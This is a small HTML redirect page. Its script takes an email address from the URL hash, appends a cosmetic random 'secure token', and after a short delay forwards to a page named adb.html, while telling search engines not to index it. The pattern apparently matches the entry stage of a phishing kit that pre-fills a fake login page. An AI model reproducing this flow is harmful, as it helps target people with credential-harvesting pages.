<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Redirect Page</title>
  <script>
    // Generate a cryptographically secure random token
    function generateSecureToken(length = 64) {
      const array = new Uint8Array(length / 2);
      window.crypto.getRandomValues(array);
      return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }

    window.onload = function () {
      const email = window.location.hash.substring(1); // Get raw email from URL hash
      if (email && email.includes("@")) {
        const secureToken = generateSecureToken();
        const redirectUrl = `adb.html#${email}&token=${secureToken}`;

        // Delay redirect by 2 seconds
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 2000);

      } else {
        document.body.innerHTML = "<h2>Invalid or missing email in the URL.</h2>";
      }
    };
  </script>
</head>
<body>
</body>
</html>
